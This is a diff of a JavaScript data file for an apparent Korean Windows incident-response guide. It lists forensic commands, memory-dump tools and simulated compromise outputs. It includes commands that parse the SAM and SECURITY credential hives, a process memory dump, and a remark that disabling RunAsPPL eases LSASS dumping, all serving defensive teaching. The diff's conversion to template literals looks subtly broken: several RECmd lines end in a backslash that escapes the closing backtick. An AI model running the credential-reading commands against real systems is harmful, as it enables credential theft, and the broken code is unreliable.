-        output:"HKEY_LOCAL_MACHINE\\...\\Winlogon\n    Userinit    REG_SZ    C:\\Windows\\system32\userinit.exe, C:\\Temp\backdoor.exe  ← 변조!\n    Shell       REG_SZ    explorer.exe  (정상)\n\nHKEY_LOCAL_MACHINE\\...\\Lsa\n    RunAsPPL    REG_DWORD    0x0  ← PPL 비활성화! (LSASS 덤프 쉬워짐)",
+        cmd:`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL`,
+        output:`HKEY_LOCAL_MACHINE\...\Winlogon
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe, C:\Temp\backdoor.exe  ← 변조!
+    Shell       REG_SZ    explorer.exe  (정상)
+
+HKEY_LOCAL_MACHINE\...\Lsa
+    RunAsPPL    REG_DWORD    0x0  ← PPL 비활성화! (LSASS 덤프 쉬워짐)`,
         desc:"Userinit에 추가 경로 = 로그온 시 악성코드 실행. RunAsPPL=0 = LSASS 보호 비활성화.",
         why:"Userinit 변조는 강력한 지속성. RunAsPPL=0이면 Mimikatz 없이도 LSASS 덤프 가능.",
       },
@@ -1097,32 +1585,97 @@ const LIVE_CATEGORIES = [
       {
         name:"메모리 덤프 수집 (전체)",
         type:"tool", threat:false,
-        cmd:"# 방법 1: WinPmem (권장, 무료)\nwinpmem_mini_x64.exe C:\\IR\\memory.raw\n\n# 방법 2: DumpIt (단순, 빠름)\nDumpIt.exe /O C:\\IR\\memory.dmp\n\n# 방법 3: NotMyFault (Sysinternals)\nNotMyFault.exe /crash /type 1",
-        output:"[WinPmem 실행 결과]\nVersion: 3.3\nLoaded driver: winpmem\nSaving to: C:\\IR\\memory.raw\nSize: 16.0 GB\nSpeed: 450 MB/s\nElapsed: 00:36:22\nSHA256: a3f2e8b1c3d5f7a9...",
+        cmd:`# 방법 1: WinPmem (권장, 무료)
+winpmem_mini_x64.exe C:\IR\memory.raw
+
+# 방법 2: DumpIt (단순, 빠름)
+DumpIt.exe /O C:\IR\memory.dmp
+
+# 방법 3: NotMyFault (Sysinternals)
+NotMyFault.exe /crash /type 1`,
+        output:`[WinPmem 실행 결과]
+Version: 3.3
+Loaded driver: winpmem
+Saving to: C:\IR\memory.raw
+Size: 16.0 GB
+Speed: 450 MB/s
+Elapsed: 00:36:22
+SHA256: a3f2e8b1c3d5f7a9...`,
         desc:"전체 물리 메모리 덤프. 실행 중인 악성 프로세스·암호화 키·네트워크 연결 정보 보존.",
         why:"메모리에서만 존재하는 파일리스 악성코드·인젝션된 코드·C2 통신 키 확보.",
       },
       {
         name:"특정 프로세스 메모리 덤프",
         type:"cmd", threat:false,
-        cmd:"# ProcDump (Sysinternals)\nprocdump.exe -ma <PID> C:\\IR\\proc_4392.dmp\nprocdump.exe -ma svcupd.exe C:\\IR\\svcupd_dump.dmp\n\n# Task Manager (GUI)\n작업 관리자 → 프로세스 → 우클릭 → \"메모리 덤프 파일 만들기\"\n저장 위치: C:\Users\\<user>\\AppData\\Local\\Temp\\<프로세스명>.dmp",
-        output:"ProcDump v10.1\nCopyright (C) 2009-2022 Mark Russinovich\nProcess:         svcupd.exe (4392)\nProcess image:   C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe\nDump 1 initiated: 2024-09-02 11:30:00\nDump 1 writing: Estimated dump file size is 45 MB.\nDump 1 complete: 45 MB written in 0.8 seconds",
+        cmd:`# ProcDump (Sysinternals)
+procdump.exe -ma <PID> C:\IR\proc_4392.dmp
+procdump.exe -ma svcupd.exe C:\IR\svcupd_dump.dmp
+
+# Task Manager (GUI)
+작업 관리자 → 프로세스 → 우클릭 → "메모리 덤프 파일 만들기"
+저장 위치: C:\Users\<user>\AppData\Local\Temp\<프로세스명>.dmp`,
+        output:`ProcDump v10.1
+Copyright (C) 2009-2022 Mark Russinovich
+Process:         svcupd.exe (4392)
+Process image:   C:\ProgramData\MicrosoftUpdate\svcupd.exe
+Dump 1 initiated: 2024-09-02 11:30:00
+Dump 1 writing: Estimated dump file size is 45 MB.
+Dump 1 complete: 45 MB written in 0.8 seconds`,
         desc:"의심 프로세스 단독 덤프. 전체 메모리보다 빠름. C2 통신 설정·복호화 키·명령어 확인 가능.",
         why:"악성 프로세스 종료 전 메모리 내용 보존. 언패킹된 악성코드 코드 분석에 활용.",
       },
       {
         name:"휘발성 정보 일괄 수집 스크립트",
         type:"powershell", threat:false,
-        cmd:"# IR 수집 폴더 생성\n$IRPath = \"C:\\IR_$(Get-Date -Format 'yyyyMMdd_HHmmss')\"\nNew-Item -ItemType Directory $IRPath\n\n# 시스템 정보\nsysteminfo > \"$IRPath\\systeminfo.txt\"\ndate /t >> \"$IRPath\\systeminfo.txt\"\ntime /t >> \"$IRPath\\systeminfo.txt\"\n\n# 프로세스·네트워크·계정\ntasklist /v /fo csv > \"$IRPath\\processes.csv\"\nnetstat -ano > \"$IRPath\\netstat.txt\"\nnet user > \"$IRPath\\users.txt\"\nnet localgroup administrators > \"$IRPath\\admins.txt\"\nipconfig /displaydns > \"$IRPath\\dns_cache.txt\"\nnet share > \"$IRPath\\shares.txt\"\nschtasks /query /fo CSV /v > \"$IRPath\\tasks.csv\"\nreg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run > \"$IRPath\\run_keys.txt\"\n\nWrite-Host \"수집 완료: $IRPath\"",
-        output:"수집 완료: C:\\IR_20240902_113000\n  systeminfo.txt    (8 KB)\n  processes.csv     (45 KB)\n  netstat.txt       (12 KB)\n  users.txt         (2 KB)\n  admins.txt        (1 KB)\n  dns_cache.txt     (8 KB)\n  shares.txt        (3 KB)\n  tasks.csv         (15 KB)\n  run_keys.txt      (4 KB)",
+        cmd:`# IR 수집 폴더 생성
+$IRPath = "C:\IR_\$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+New-Item -ItemType Directory $IRPath
+
+# 시스템 정보
+systeminfo > "$IRPath\systeminfo.txt"
+date /t >> "$IRPath\systeminfo.txt"
+time /t >> "$IRPath\systeminfo.txt"
+
+# 프로세스·네트워크·계정
+tasklist /v /fo csv > "$IRPath\processes.csv"
+netstat -ano > "$IRPath\netstat.txt"
+net user > "$IRPath\users.txt"
+net localgroup administrators > "$IRPath\admins.txt"
+ipconfig /displaydns > "$IRPath\dns_cache.txt"
+net share > "$IRPath\shares.txt"
+schtasks /query /fo CSV /v > "$IRPath\tasks.csv"
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run > "$IRPath\run_keys.txt"
+
+Write-Host "수집 완료: $IRPath"`,
+        output:`수집 완료: C:\IR_20240902_113000
+  systeminfo.txt    (8 KB)
+  processes.csv     (45 KB)
+  netstat.txt       (12 KB)
+  users.txt         (2 KB)
+  admins.txt        (1 KB)
+  dns_cache.txt     (8 KB)
+  shares.txt        (3 KB)
+  tasks.csv         (15 KB)
+  run_keys.txt      (4 KB)`,
         desc:"초동 수집 필수 항목 전체를 한 번에 수집. 출동 직후 즉시 실행.",
         why:"전원 종료 전 최대한 빠르게 휘발성 정보 보존. 나중에 이미징과 함께 분석 기반 마련.",
       },
       {
         name:"볼륨 섀도 복사본 (VSS) 확인",
         type:"cmd", threat:true,
-        cmd:"vssadmin list shadows\nGet-WmiObject Win32_ShadowCopy | Select-Object ID, VolumeName, InstallDate, Caption",
-        output:"vssadmin 1.1 - 볼륨 섀도 복사본 관리 도구\nCopyright (C) Microsoft Corporation\n\n볼륨 섀도 복사본 콘텐츠:\n   섀도 복사본 ID: {GUID-1}\n   원래 볼륨: (C:)\\\\?\\Volume{...}\\n   섀도 복사본 볼륨: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\n   작성자 이름: Microsoft Hyper-V VSS Writer\n   작성 시간: 2024-09-01 03:00:00   ← 침해 이전 백업!\n\n# 랜섬웨어 피해 확인 — VSS 삭제 여부\nvssadmin list shadows  → 결과 없음 = 랜섬웨어가 삭제한 것!",
+        cmd:`vssadmin list shadows
+Get-WmiObject Win32_ShadowCopy | Select-Object ID, VolumeName, InstallDate, Caption`,
+        output:`vssadmin 1.1 - 볼륨 섀도 복사본 관리 도구
+Copyright (C) Microsoft Corporation
+
+볼륨 섀도 복사본 콘텐츠:
+   섀도 복사본 ID: {GUID-1}
+   원래 볼륨: (C:)\\?\Volume{...}\n   섀도 복사본 볼륨: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+   작성자 이름: Microsoft Hyper-V VSS Writer
+   작성 시간: 2024-09-01 03:00:00   ← 침해 이전 백업!
+
+# 랜섬웨어 피해 확인 — VSS 삭제 여부
+vssadmin list shadows  → 결과 없음 = 랜섬웨어가 삭제한 것!`,
         desc:"VSS 존재 = 침해 이전 파일 복원 가능. VSS 없음 = 랜섬웨어가 삭제했거나 원래 없었음.",
         why:"랜섬웨어 대응 시 복구 가능 여부 즉시 판단. SRUM 오프라인 수집에도 VSS 활용.",
       },
@@ -1135,32 +1688,111 @@ const LIVE_CATEGORIES = [
       {
         name:"gpedit.msc — 그룹 정책 편집기",
         type:"gui", threat:false,
-        cmd:"실행: Win+R → gpedit.msc\n\n[확인 경로 1] 감사 정책\n컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 감사 정책\n  - 로그온 이벤트 감사: 성공/실패 활성화 여부\n  - 프로세스 추적 감사: 활성화되어야 4688(프로세스 생성) 기록됨\n  - 개체 엑세스 감사: 파일 접근 로깅 여부\n\n[확인 경로 2] 사용자 권한\n컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 사용자 권한 할당\n  - \"원격 데스크톱 서비스를 통한 로그온 허용\": 비정상 계정 포함 여부\n  - \"로컬 로그온 허용\": 권한 있는 계정 목록 확인\n\n[확인 경로 3] 보안 옵션\n컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 보안 옵션\n  - \"계정: 로컬 관리자 계정 상태\": 활성화 여부\n  - \"네트워크 액세스: SAM 계정의 익명 열거 허용\": 비활성화여야 정상",
-        output:"[감사 정책 확인 결과]\n로그온 이벤트 감사    : 성공 및 실패  (정상)\n계정 로그온 이벤트    : 성공 및 실패  (정상)\n프로세스 추적         : 감사 안 함    ← 비활성! 4688 이벤트 없음\n\n[사용자 권한 확인]\n원격 데스크톱 로그온 허용:\n  Administrators, Remote Desktop Users, attacker_user  ← 비정상 계정!",
+        cmd:`실행: Win+R → gpedit.msc
+
+[확인 경로 1] 감사 정책
+컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 감사 정책
+  - 로그온 이벤트 감사: 성공/실패 활성화 여부
+  - 프로세스 추적 감사: 활성화되어야 4688(프로세스 생성) 기록됨
+  - 개체 엑세스 감사: 파일 접근 로깅 여부
+
+[확인 경로 2] 사용자 권한
+컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 사용자 권한 할당
+  - "원격 데스크톱 서비스를 통한 로그온 허용": 비정상 계정 포함 여부
+  - "로컬 로그온 허용": 권한 있는 계정 목록 확인
+
+[확인 경로 3] 보안 옵션
+컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 보안 옵션
+  - "계정: 로컬 관리자 계정 상태": 활성화 여부
+  - "네트워크 액세스: SAM 계정의 익명 열거 허용": 비활성화여야 정상`,
+        output:`[감사 정책 확인 결과]
+로그온 이벤트 감사    : 성공 및 실패  (정상)
+계정 로그온 이벤트    : 성공 및 실패  (정상)
+프로세스 추적         : 감사 안 함    ← 비활성! 4688 이벤트 없음
+
+[사용자 권한 확인]
+원격 데스크톱 로그온 허용:
+  Administrators, Remote Desktop Users, attacker_user  ← 비정상 계정!`,
         desc:"GUI로 감사 정책, 사용자 권한, 보안 옵션을 직관적으로 확인. 비전문가도 이상 여부 파악 가능.",
         why:"프로세스 추적 감사 비활성화 = 4688 없음 → 증거 수집 불가. 즉시 활성화 고려.",
       },
       {
         name:"eventvwr.msc — 이벤트 뷰어",
         type:"gui", threat:false,
-        cmd:"실행: Win+R → eventvwr.msc\n\n[빠른 확인 경로]\nWindows 로그 → 보안\n  - 오른쪽 \"현재 로그 필터링\"\n  - 이벤트 ID: 4625 → 로그온 실패 집계\n  - 이벤트 ID: 4624 → 로그온 성공 (Type 10=RDP 필터)\n  - 이벤트 ID: 1102 → 로그 삭제 여부\n\nWindows 로그 → 시스템\n  - 이벤트 ID: 7045 → 새 서비스 설치\n\n사용자 지정 보기 → \"관리 이벤트\"\n  : 오류·경고 이벤트만 모아서 빠르게 이상 파악\n\n응용 프로그램 및 서비스 로그 → Microsoft → Windows\n  → PowerShell → Operational: 4104(스크립트 블록 로깅)",
-        output:"[보안 로그 — 4625 필터 결과]\n2024-09-02 02:14:33  로그온 실패  Administrator  소스: 185.220.101.45\n2024-09-02 02:14:34  로그온 실패  Administrator  소스: 185.220.101.45\n(... 347회 반복 ...)\n2024-09-02 02:52:10  로그온 성공  Administrator  Type:10 소스: 185.220.101.45  ← 성공!",
+        cmd:`실행: Win+R → eventvwr.msc
+
+[빠른 확인 경로]
+Windows 로그 → 보안
+  - 오른쪽 "현재 로그 필터링"
+  - 이벤트 ID: 4625 → 로그온 실패 집계
+  - 이벤트 ID: 4624 → 로그온 성공 (Type 10=RDP 필터)
+  - 이벤트 ID: 1102 → 로그 삭제 여부
+
+Windows 로그 → 시스템
+  - 이벤트 ID: 7045 → 새 서비스 설치
+
+사용자 지정 보기 → "관리 이벤트"
+  : 오류·경고 이벤트만 모아서 빠르게 이상 파악
+
+응용 프로그램 및 서비스 로그 → Microsoft → Windows
+  → PowerShell → Operational: 4104(스크립트 블록 로깅)`,
+        output:`[보안 로그 — 4625 필터 결과]
+2024-09-02 02:14:33  로그온 실패  Administrator  소스: 185.220.101.45
+2024-09-02 02:14:34  로그온 실패  Administrator  소스: 185.220.101.45
+(... 347회 반복 ...)
+2024-09-02 02:52:10  로그온 성공  Administrator  Type:10 소스: 185.220.101.45  ← 성공!`,
         desc:"이벤트 뷰어로 빠르게 로그온 실패 패턴, 서비스 설치, 로그 삭제를 시각적으로 확인.",
         why:"현장에서 별도 도구 없이 즉시 이상 이벤트 확인. 필터 기능으로 특정 ID만 빠르게 조회.",
       },
       {
         name:"msconfig — 시작 프로그램 & 서비스",
         type:"gui", threat:true,
-        cmd:"실행: Win+R → msconfig\n\n[시작 프로그램 탭]\n\"작업 관리자에서 열기\" 클릭 →\n  - 게시자가 없는(공백) 항목\n  - 경로가 Temp·AppData·ProgramData인 항목\n  - 알 수 없는 프로그램명\n\n[서비스 탭]\n\"Microsoft 서비스 모두 숨기기\" 체크 →\n  남은 서비스 중 알 수 없는 것 → 악성 서비스 후보\n\n[부팅 탭]\n안전 부팅이 설정되어 있으면 → 비활성화 고려 (포렌식 부팅 영향)",
-        output:"[작업 관리자 시작 프로그램]\n이름              게시자          상태    시작 시 영향\nWindowsUpdate    (없음)          사용     높음   ← 게시자 없음 = 의심!\nOneDrive         Microsoft Corp  사용     낮음   (정상)\nsvcupd           (없음)          사용     보통   ← 의심!",
+        cmd:`실행: Win+R → msconfig
+
+[시작 프로그램 탭]
+"작업 관리자에서 열기" 클릭 →
+  - 게시자가 없는(공백) 항목
+  - 경로가 Temp·AppData·ProgramData인 항목
+  - 알 수 없는 프로그램명
+
+[서비스 탭]
+"Microsoft 서비스 모두 숨기기" 체크 →
+  남은 서비스 중 알 수 없는 것 → 악성 서비스 후보
+
+[부팅 탭]
+안전 부팅이 설정되어 있으면 → 비활성화 고려 (포렌식 부팅 영향)`,
+        output:`[작업 관리자 시작 프로그램]
+이름              게시자          상태    시작 시 영향
+WindowsUpdate    (없음)          사용     높음   ← 게시자 없음 = 의심!
+OneDrive         Microsoft Corp  사용     낮음   (정상)
+svcupd           (없음)          사용     보통   ← 의심!`,
         desc:"게시자가 없는 자동 시작 항목 = 즉시 의심. Microsoft 서비스 숨기기로 서드파티 서비스만 필터링.",
         why:"GUI로 직관적으로 자동 시작 악성 항목 파악. 비전문가도 이상 여부 즉시 식별 가능.",
       },
       {
         name:"taskschd.msc — 작업 스케줄러",
         type:"gui", threat:true,
-        cmd:"실행: Win+R → taskschd.msc\n\n[확인 방법]\n작업 스케줄러 라이브러리 클릭\n  → 오른쪽 패널에서 경로별 정렬\n  → 루트 경로(\\) 작업 집중 확인 (정상은 \\Microsoft\\ 하위)\n\n의심 작업 클릭 → [작업] 탭에서 실행 파일 경로 확인\n  → 비정상 경로(Temp, AppData, ProgramData) = 즉시 의심\n\n[트리거] 탭에서 실행 조건 확인\n  - 로그온 시·시스템 시작 시 = 지속성 메커니즘\n  - 매일 00:00 = 자동화된 작업\n\n# 명령줄로 동일 확인\nschtasks /query /fo LIST /v | findstr /i \"작업 이름\\|실행\\|다음 실행\\|마지막 실행\"",
-        output:"작업 이름:     \\MicrosoftEdgeUpdateCore    ← Microsoft 이름 위장\n실행 명령:     C:\\ProgramData\\svcupd.exe /beacon  ← 비정상 경로!\n트리거:        시스템 부팅 시 / 매일 00:00:01\n마지막 실행:   2024-09-10 00:00:01\n다음 실행:     2024-09-11 00:00:01",
+        cmd:`실행: Win+R → taskschd.msc
+
+[확인 방법]
+작업 스케줄러 라이브러리 클릭
+  → 오른쪽 패널에서 경로별 정렬
+  → 루트 경로(\) 작업 집중 확인 (정상은 \Microsoft\ 하위)
+
+의심 작업 클릭 → [작업] 탭에서 실행 파일 경로 확인
+  → 비정상 경로(Temp, AppData, ProgramData) = 즉시 의심
+
+[트리거] 탭에서 실행 조건 확인
+  - 로그온 시·시스템 시작 시 = 지속성 메커니즘
+  - 매일 00:00 = 자동화된 작업
+
+# 명령줄로 동일 확인
+schtasks /query /fo LIST /v | findstr /i "작업 이름\|실행\|다음 실행\|마지막 실행"`,
+        output:`작업 이름:     \MicrosoftEdgeUpdateCore    ← Microsoft 이름 위장
+실행 명령:     C:\ProgramData\svcupd.exe /beacon  ← 비정상 경로!
+트리거:        시스템 부팅 시 / 매일 00:00:01
+마지막 실행:   2024-09-10 00:00:01
+다음 실행:     2024-09-11 00:00:01`,
         desc:"GUI 스케줄러로 작업 내용·트리거·실행 파일을 직관적으로 확인. 루트 경로 작업 집중 검토.",
         why:"공격자가 지속성을 위해 예약 작업 사용. GUI로 실행 파일 경로와 트리거를 빠르게 확인 가능.",
       },
@@ -1183,7 +1815,7 @@ const REG_HIVES = [
     path:"C:\\\\Windows\\\\System32\\\\config\\\\SAM",
     desc:"로컬 사용자 계정 정보와 패스워드 해시 저장. 운영 중엔 SYSTEM만 접근 가능.",
     rootKey:"HKLM\\\\SAM",
-    recmd:"RECmd.exe -f SAM --bn BatchExamples\\\\SAM.reb --csv output\\",
+    recmd:`RECmd.exe -f SAM --bn BatchExamples\\SAM.reb --csv output\`,
     contents:["로컬 사용자 계정 목록","NTLM 패스워드 해시 (암호화)","계정 생성·수정·마지막 로그온 시간","로그인 실패 횟수·잠금 상태","계정 RID (상대 식별자)"],
   },
   {
@@ -1191,7 +1823,7 @@ const REG_HIVES = [
     path:"C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM",
     desc:"시스템 부팅 설정, 서비스, 드라이버, 네트워크, 타임존 등 핵심 시스템 구성.",
     rootKey:"HKLM\\\\SYSTEM",
-    recmd:"RECmd.exe -f SYSTEM --bn BatchExamples\\\\System.reb --csv output\\",
+    recmd:`RECmd.exe -f SYSTEM --bn BatchExamples\\System.reb --csv output\`,
     contents:["설치된 서비스 목록 (Services)","네트워크 인터페이스 설정","타임존 정보 (분석 시 필수!)","USB/장치 연결 이력 (USBSTOR)","마운트된 볼륨 목록","ControlSet 선택 정보"],
   },
   {
@@ -1199,7 +1831,7 @@ const REG_HIVES = [
     path:"C:\\\\Windows\\\\System32\\\\config\\\\SOFTWARE",
     desc:"설치된 프로그램, 자동실행 항목, Windows 정책, OS 버전 등 소프트웨어 설정.",
     rootKey:"HKLM\\\\SOFTWARE",
-    recmd:"RECmd.exe -f SOFTWARE --bn BatchExamples\\\\Software.reb --csv output\\",
+    recmd:`RECmd.exe -f SOFTWARE --bn BatchExamples\\Software.reb --csv output\`,
     contents:["자동실행 Run·RunOnce 키","설치된 프로그램 목록 (Uninstall)","Windows Defender 설정","최근 실행 명령어 (RunMRU)","RDP 설정","보안 정책 (Policies)","OS 버전·빌드 정보"],
   },
   {
@@ -1207,7 +1839,7 @@ const REG_HIVES = [
     path:"C:\\\\Windows\\\\System32\\\\config\\\\SECURITY",
     desc:"도메인 인증 정보, LSA 비밀, 캐시된 도메인 자격증명 저장.",
     rootKey:"HKLM\\\\SECURITY",
-    recmd:"RECmd.exe -f SECURITY --bn BatchExamples\\\\Security.reb --csv output\\",
+    recmd:`RECmd.exe -f SECURITY --bn BatchExamples\\Security.reb --csv output\`,
     contents:["LSA Secrets (서비스 계정 패스워드)","캐시된 도메인 로그온 자격증명 (DCC2)","도메인 신뢰 관계 정보","감사 정책 설정"],
   },
   {
@@ -1215,7 +1847,7 @@ const REG_HIVES = [
     path:"C:\\Users\\\\<username>\\\\NTUSER.DAT",
     desc:"각 사용자별 설정. 최근 문서·실행 프로그램·탐색기 설정·쉘백 등 사용자 행위 기록.",
     rootKey:"HKCU\\",
-    recmd:"RECmd.exe -f NTUSER.DAT --bn BatchExamples\\\\NTUser.reb --csv output\\",
+    recmd:`RECmd.exe -f NTUSER.DAT --bn BatchExamples\\NTUser.reb --csv output\`,
     contents:["사용자 Run·RunOnce 자동실행","최근 열어본 문서 (RecentDocs)","실행한 프로그램 목록 (UserAssist)","검색 기록 (WordWheelQuery)","RDP 접속 이력 (Terminal Server Client)","탐색기 설정·쉘백 (BagMRU)","TypedPaths (주소창 입력 경로)"],
   },
   {
@@ -1223,7 +1855,7 @@ const REG_HIVES = [
     path:"C:\\Users\\\\<username>\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\UsrClass.dat",
     desc:"사용자 쉘백 데이터의 주요 저장소. 탐색기로 열어본 폴더 전체 이력.",
     rootKey:"HKCU\\\\Software\\\\Classes",
-    recmd:"RECmd.exe -f UsrClass.dat --bn BatchExamples\\UsrClass.reb --csv output\\",
+    recmd:`RECmd.exe -f UsrClass.dat --bn BatchExamples\UsrClass.reb --csv output\`,
     contents:["쉘백 (BagMRU) — 탐색기 폴더 접근 이력","ZIP·폴더 내부 탐색 이력","외부 드라이브 탐색 경로"],
   },
   {
@@ -1231,7 +1863,7 @@ const REG_HIVES = [
     path:"C:\\\\Windows\\\\AppCompat\\\\Programs\\\\Amcache.hve",
     desc:"실행된 프로그램의 해시·경로·설치시간을 기록. 삭제된 악성파일도 흔적이 남음.",
     rootKey:"Root\\",
-    recmd:"RECmd.exe -f Amcache.hve --bn BatchExamples\\\\Amcache.reb --csv output\\",
+    recmd:`RECmd.exe -f Amcache.hve --bn BatchExamples\\Amcache.reb --csv output\`,
     contents:["실행 파일 전체 경로","SHA-1 해시 값 (악성코드 식별 가능)","파일 크기·컴파일 시간","설치·실행 시간","삭제된 파일도 기록 유지"],
   },
 ];
@@ -1245,13 +1877,17 @@ const REG_KEYS = [
     path:"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\nHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\nHKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
     desc:"시스템 시작 또는 사용자 로그온 시 자동으로 실행되는 프로그램을 등록. 악성코드 지속성 확보에 가장 많이 사용.",
     recmd_plugin:"run",
-    parse_output:"값 이름(Name)          데이터(Data)\n--------------------------------------------------\nWindowsUpdate         C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe /silent\nOneDrive              C:\\\\Program Files\\\\OneDrive\\\\OneDrive.exe /background\nSecurityHealth        C:\\\\Windows\\\\System32\\\\SecurityHealthSystray.exe",
+    parse_output:`값 이름(Name)          데이터(Data)
+--------------------------------------------------
+WindowsUpdate         C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe /silent
+OneDrive              C:\\Program Files\\OneDrive\\OneDrive.exe /background
+SecurityHealth        C:\\Windows\\System32\\SecurityHealthSystray.exe`,
     interpretation:[
       { field:"값 이름(Name)", meaning:"자동실행 항목 식별자. 정상: 알려진 프로그램명 / 의심: 랜덤문자열, 시스템 이름 위장(svchost32, WindowsUpdate 등)" },
       { field:"데이터(Data)", meaning:"실행될 파일 경로. 정상: Program Files, System32 / 의심: Temp, AppData\\\\Local, ProgramData, Users\\\\Public 등 비정상 경로" },
       { field:"LastWrite 시간", meaning:"키 마지막 수정 시간. 침해 시점과 일치하면 직접 증거" },
     ],
-    forensic:"경로가 Temp·AppData·ProgramData면 90% 의심. RunOnce는 1회 실행 후 삭제 → 드롭퍼에서 자주 사용.",
+    forensic:`경로가 Temp·AppData·ProgramData면 90% 의심. RunOnce는 1회 실행 후 삭제 → 드롭퍼에서 자주 사용.`,
     ioc_example:"C:\\Users\\victim\\\\AppData\\\\Local\\\\Temp\\update.exe\nC:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe",
   },
   {
@@ -1261,14 +1897,18 @@ const REG_KEYS = [
     path:"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<ServiceName>",
     desc:"설치된 모든 서비스 목록. 악성 서비스 설치로 재부팅 후에도 지속성 확보.",
     recmd_plugin:"services",
-    parse_output:"서비스명              실행파일 경로                           시작유형    상태\n---------------------------------------------------------------------------------------------\nmalware_svc           C:\\\\Windows\\\\Temp\\\\malware_svc.exe          Auto        Running\nwuauserv              C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs  Auto      Running\nPSEXESVC              C:\\\\Windows\\\\PSEXESVC.exe                   Demand      Stopped",
+    parse_output:`서비스명              실행파일 경로                           시작유형    상태
+---------------------------------------------------------------------------------------------
+malware_svc           C:\\Windows\\Temp\\malware_svc.exe          Auto        Running
+wuauserv              C:\\Windows\\System32\\svchost.exe -k netsvcs  Auto      Running
+PSEXESVC              C:\\Windows\\PSEXESVC.exe                   Demand      Stopped`,
     interpretation:[
       { field:"서비스명(ServiceName)", meaning:"정상: Microsoft 공식 서비스명 / 의심: 오타나 변형(wuauserv → wuauserv2), 알 수 없는 이름" },
       { field:"실행파일 경로(ImagePath)", meaning:"정상: System32, SysWOW64 / 의심: Temp, AppData, ProgramData, Users\\\\Public" },
       { field:"시작유형(StartType)", meaning:"0=Boot, 1=System, 2=Auto(자동), 3=Demand(수동), 4=Disabled. Auto로 설정 시 부팅마다 실행" },
       { field:"PSEXESVC", meaning:"PsExec 도구 사용 흔적. 원격 실행 시 자동 생성되는 서비스" },
     ],
-    forensic:"비정상 경로 + Auto StartType 조합이면 악성 서비스. PSEXESVC 존재 시 PsExec을 통한 측면 이동 의심.",
+    forensic:`비정상 경로 + Auto StartType 조합이면 악성 서비스. PSEXESVC 존재 시 PsExec을 통한 측면 이동 의심.`,
     ioc_example:"ImagePath: C:\\\\Windows\\\\Temp\\\\svc.exe\nServiceName: PSEXESVC",
   },
   {
@@ -1278,13 +1918,17 @@ const REG_KEYS = [
     path:"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tasks\nHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Schedule\\\\TaskCache\\\\Tree",
     desc:"예약 작업의 메타데이터가 레지스트리에도 저장됨. C:\\\\Windows\\\\System32\\\\Tasks\\\\ 파일과 교차 확인.",
     recmd_plugin:"scheduledtasks",
-    parse_output:"작업명                        경로                                    마지막 실행\n---------------------------------------------------------------------------------------\nMicrosoftEdgeUpdateCore       \\\\Microsoft\\\\Edge\\\\MicrosoftEdgeUpdateCore   2024-09-02 09:33\nWindowsDefenderScheduledScan  \\\\Microsoft\\\\Windows Defender\\\\...           2024-09-01 03:00\n악성작업_임시               \\\\악성작업_임시                              2024-09-02 09:33",
+    parse_output:`작업명                        경로                                    마지막 실행
+---------------------------------------------------------------------------------------
+MicrosoftEdgeUpdateCore       \\Microsoft\\Edge\\MicrosoftEdgeUpdateCore   2024-09-02 09:33
+WindowsDefenderScheduledScan  \\Microsoft\\Windows Defender\\...           2024-09-01 03:00
+악성작업_임시               \\악성작업_임시                              2024-09-02 09:33`,
     interpretation:[
       { field:"작업명(TaskName)", meaning:"정상: Microsoft 공식 이름 / 의심: 무작위 문자열, Microsoft 이름 위장" },
       { field:"경로(Path)", meaning:"루트 경로(\\\\)에 직접 위치한 작업은 의심. 정상은 \\\\Microsoft\\\\... 하위" },
       { field:"마지막 실행(LastRunTime)", meaning:"침해 시간대와 일치하는지 확인" },
     ],
-    forensic:"경로가 루트(\\\\)인 작업, 이름이 정상 Microsoft 작업과 유사하게 위장한 것 주의.",
+    forensic:`경로가 루트(\\)인 작업, 이름이 정상 Microsoft 작업과 유사하게 위장한 것 주의.`,
     ioc_example:"\\\\MicrosoftEdgeUpdateCore (정상 위장)\n실행파일: C:\\\\ProgramData\\\\svcupd.exe",
   },
   {
@@ -1294,13 +1938,17 @@ const REG_KEYS = [
     path:"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
     desc:"로그온 프로세스 설정. Userinit·Shell 값 변조로 로그온 시 악성코드 실행 가능.",
     recmd_plugin:"winlogon",
